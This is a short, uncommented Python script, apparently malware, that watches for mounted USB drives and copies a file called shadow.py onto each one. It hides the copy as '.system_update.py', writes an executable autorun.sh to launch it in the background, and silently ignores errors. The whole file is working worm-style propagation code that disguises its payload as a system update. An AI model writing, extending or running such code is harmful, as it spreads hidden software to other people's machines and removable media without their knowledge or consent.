import os
import time
import shutil
import subprocess

def watch_usb():
    while True:
        try:
            output = subprocess.check_output("lsblk -o NAME,MOUNTPOINT", shell=True).decode()
            for line in output.split('\n'):
                if '/media/' in line or '/mnt/' in line:
                    mount_point = line.split()[-1].strip()
                    if os.path.exists(mount_point):
                        shutil.copy('shadow.py', f"{mount_point}/.system_update.py")
                        with open(f"{mount_point}/autorun.sh", 'w') as f:
                            f.write(f"#!/bin/bash\npython3 {mount_point}/.system_update.py &\n")
                        os.chmod(f"{mount_point}/autorun.sh", 0o755)
        except:
            pass
        time.sleep(5)